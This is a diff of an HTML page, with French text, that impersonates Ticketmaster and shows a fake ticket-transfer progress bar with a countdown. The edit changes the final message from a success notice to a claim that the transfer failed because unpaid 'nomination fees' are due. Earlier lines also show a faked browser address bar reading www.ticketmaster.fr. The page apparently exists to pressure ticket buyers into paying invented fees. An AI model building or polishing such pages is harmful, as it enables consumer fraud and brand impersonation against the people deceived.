@@ -11,25 +11,21 @@
     * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
     body { margin:0; background:#f5f6f7; color:#111; }
 
-    /* TOP BAR */
-    .browser-bar {
-      background:#f2f2f2;
-      padding:10px 14px;
-      display:flex;
-      gap:10px;
-      font-size:14px;
-    }
-    .browser-bar .alert { color:#d93025; font-weight:700; }
-
     /* HEADER */
     .topbar {
       background:linear-gradient(90deg,#0052cc,#0078ff);
       padding:14px;
       display:flex;
       justify-content:space-between;
+      align-items:center;
       color:#fff;
     }
-    .topbar img { height:26px; }
+
+    .site-title {
+      color: white;
+      font-size: 18px;
+      font-weight: 700;
+    }
 
     /* SEARCH */
     .search-box {
@@ -84,7 +80,6 @@
 
     .card h2 { font-size:20px; margin-bottom:16px; }
 
-    /* TRANSFER STATUS */
     .status-text {
       font-size:15px;
       margin-bottom:12px;
@@ -112,17 +107,22 @@
       color:#444;
     }
 
-    .filter {
-      margin-top:14px;
-      font-size:14px;
+    .cancel-btn {
+      margin-top: 14px;
+      width: 100%;
+      padding: 12px;
+      background: #b30000;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
     }
 
-    /* FOOTER */
-    .legal {
-      font-size:12px;
-      color:#555;
-      line-height:1.5;
-      margin:18px;
+    .cancel-btn:disabled {
+      background: #999;
+      cursor: not-allowed;
     }
 
     /* RESPONSIVE */
@@ -131,40 +131,20 @@
       .card h2{font-size:18px;}
       .menu-item{font-size:12px;}
       .menu-item .icon{width:34px;height:34px;}
+      .site-title{
+        color:white;
+        font-size:16px;
+        font-weight:700;
+      }
     }
-
-    .cancel-btn {
-  margin-top: 14px;
-  width: 100%;
-  padding: 12px;
-  background: #b30000;
-  color: #fff;
-  border: none;
-  border-radius: 6px;
-  font-size: 15px;
-  font-weight: 600;
-  cursor: pointer;
-}
-
-.cancel-btn:disabled {
-  background: #999;
-  cursor: not-allowed;
-}
-
   </style>
 </head>
 
 <body>
 
-  <!-- Safari bar 
-  <div class="browser-bar">
-    <span class="alert">❗</span>
-    <strong>www.ticketmaster.fr</strong>
-  </div>-->
-
   <!-- Header -->
   <div class="topbar">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Ticketmaster_logo.svg">
+    <span class="site-title">Ticketmaster</span>
     <div>☰ 👤 🛍️</div>
   </div>
 
@@ -205,22 +185,15 @@
       <div class="countdown" id="countdown">
         Le transfert se terminera dans 00:00
       </div>
+
       <button id="cancelBtn" class="cancel-btn">
-  Annuler le transfert
-</button>
-
-
-     <!-- <div class="filter">
-        Filtrer par : <strong>Toutes les commandes ▾</strong>
-      </div>-->
+        Annuler le transfert
+      </button>
     </div>
   </div>
 
-  <!-- Legal -->
-  <div class="legal">
-    Nous utilisons vos informations pour vous fournir nos services, et pour vous informer des préventes, actualités ou bons plans concerts et spectacles, de manière pe
- <script>
-  const totalTime = 600; // 10 minutes en secondes
+<script>
+  const totalTime = 600;
   let elapsed = 0;
   let interval = null;
   let cancelled = false;
@@ -247,7 +220,8 @@
       if (elapsed >= totalTime) {
         clearInterval(interval);
         progress.style.width = '100%';
-        countdown.textContent = '✅ Transfert terminé avec succès';
+        countdown.textContent =
+          "Désolé votre transfert n'a pas abouti parceque vous n'avez pas payer les frais de nomination";
         cancelBtn.disabled = true;
       }
     }, 1000);
@@ -261,7 +235,6 @@
     cancelBtn.disabled = true;
   });
 
-  // 🚀 Démarrage automatique
   window.addEventListener('load', startTransfer);
 </script>
 
